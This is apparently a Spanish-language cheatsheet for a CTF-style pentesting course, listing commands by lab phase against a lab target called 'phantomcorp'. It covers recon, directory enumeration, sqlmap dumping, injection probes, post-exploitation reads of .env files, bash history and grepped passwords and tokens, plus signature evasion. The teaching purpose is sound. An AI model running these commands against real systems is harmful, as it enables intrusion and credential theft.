# Cheatsheet — comandos por fase

> Referencia rápida de las tools, no un walkthrough. Acá NO hay flags: hay
> comandos. El *qué* corrés está acá; el *dónde apunta* y *qué encontrás* lo
> ponés vos. Copiá, entendé, adaptá. `phantomcorp` es el nombre del target
> dentro de la consola del atacante.

## Motor del curso (siempre igual)

```bash
make setup                       # una vez: arma la consola con las tools
./ctf list                       # lista los labs disponibles
./ctf lab NN                     # levanta el lab NN y abre su guía
make shell                       # entrás a la consola del atacante
./ctf submit NN R1 'FLAG{...}'   # entregás una flag
./ctf status NN                  # tu progreso en el lab
make down                        # baja los contenedores del lab
```

Sincronizar tu fork con la cátedra (upstream):

```bash
git checkout main
git fetch upstream
git merge upstream/main
git push origin main
```

---

## Lab 05 · Reconocimiento

```bash
nmap -Pn phantomcorp                 # escaneo básico (1000 puertos comunes)
nmap -Pn -p- phantomcorp             # TODOS los 65535 puertos
nmap -Pn -sV -p- phantomcorp         # el combo: todos los puertos + versiones
ncat phantomcorp 21                  # conectate a un servicio y leé su banner
ncat -w2 phantomcorp 31337 </dev/null   # -w2 = timeout 2s (puertos altos)
curl -I phantomcorp                  # solo HEADERS (no el cuerpo)
curl -sv phantomcorp 2>&1 | head     # -v = verbose: toda la conversación HTTP
curl -s phantomcorp/robots.txt       # rutas que el server "pide no indexar"
whois ejemplo.com                    # dueño, contactos, fechas del dominio
dig +short TXT ejemplo.com           # los TXT filtran SPF, verificaciones...
```

## Lab 06 · Enumeración de servicios

```bash
gobuster dir -u http://phantomcorp -w /usr/share/dirb/wordlists/common.txt
dirb http://phantomcorp/                         # wordlist common.txt por defecto
dirb http://phantomcorp/ -X .bak,.old,.txt        # probar estas extensiones
curl -X OPTIONS -i http://phantomcorp/           # ¿qué métodos HTTP acepta?
curl -s http://phantomcorp/.git/config           # ¿hay un repo git expuesto?
curl -s http://phantomcorp/api/users | jq        # enumerar una API y parsear
nmap --script http-methods,http-enum phantomcorp # scripts de enum de nmap
whatweb http://phantomcorp                       # fingerprint de tecnología
```

## Lab 07 · Explotación

```bash
# SQL injection
curl -s -G http://phantomcorp/buscar --data-urlencode "q=Router"
sqlmap -u "http://phantomcorp/buscar?q=Router" --batch --dbs
sqlmap -u "http://phantomcorp/buscar?q=Router" --batch --dump -T secrets
# Command injection
curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1"
# Path traversal / LFI
curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=catalogo.txt"
# Bypass de login (probá payloads en el POST)
curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin" --data-urlencode "pass=x"
```

> `--data-urlencode` te deja meter comillas, espacios y metacaracteres sin
> romper la URL. Es tu mejor amigo para probar payloads.

## Lab 08 · Post-explotación

```bash
make shell-victima                   # OJO: entrás al HOST COMPROMETIDO (no al atacante)
id ; whoami ; hostname ; uname -a    # ¿quién soy y dónde estoy?
sudo -l 2>/dev/null                  # ¿puedo correr algo como root?
find / -perm -4000 -type f 2>/dev/null       # binarios SUID (vía de escalada)
cat /var/www/.env                    # configs de apps = credenciales
cat ~/.bash_history                  # qué corrió el usuario antes (oro)
grep -rai "pass\|secret\|token" /var/www 2>/dev/null
curl -s http://phantomcorp-db/       # host interno: solo se alcanza DESDE la víctima
```

## Lab 09 · Agentes de pentest (LLM)

```bash
export LLM_PROVIDER=mock                             # offline, sin API key
export LLM_PROVIDER=claude ; export ANTHROPIC_API_KEY=sk-ant-...
export LLM_PROVIDER=openai ; export OPENAI_API_KEY=sk-...
make shell                           # la consola se lleva LLM_PROVIDER y la key
python3 agente_pentest.py            # el agente de referencia (ya funciona)
python3 agente_esqueleto.py          # el TUYO (completás el loop de tool-use)
```

## Lab 10 · Detección y evasión

```bash
curl -s http://phantomcorp/soc               # el panel del defensor (SOC)
curl -s http://phantomcorp/soc | grep ALERT  # ¿qué disparó alertas?
curl -s http://phantomcorp/soc/reglas        # las firmas/reglas activas
curl -s -A sqlmap http://phantomcorp/        # -A = User-Agent (¿te detecta por eso?)
curl -s "http://phantomcorp/api?q=..."       # probá cómo evadir una firma
```

## Lab 11 · Forensia (DFIR)

```bash
cd labs/lab11-forensia/caso
shasum -a 256 -c evidencia.sha256    # cadena de custodia: ¿qué archivo fue tocado?
grep -R "FLAG" .                     # los hallazgos NO están tan a la vista...
python3 ../src/timeline.py           # reconstruí la línea de tiempo del ataque
# Analizá: logs/ (access.log, auth.log), disco/, memoria/ (pslist, netstat, bash_history)
```

---

## Codificaciones que vas a cruzar

```bash
echo 'texto' | base64                # codificar
echo 'dGV4dG8=' | base64 -d          # decodificar
python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" 'FLAG%7Bx%7D'
xxd archivo | head                   # ver bytes en hexadecimal
file sospechoso                      # ¿qué tipo de archivo es realmente?
```

## Labs de código (01-04)

```bash
python3 src/verificar.py             # autoevaluación: feedback instantáneo
```

> ¿Un comando no está? Es a propósito: parte del lab es que descubras la tool.
> El [Banco de Retos](BANCO-DE-RETOS.md) tiene desafíos con tools más avanzadas.
> Jerga que no entendés → [Glosario](GLOSARIO.md). Problemas → [FAQ](FAQ.md).
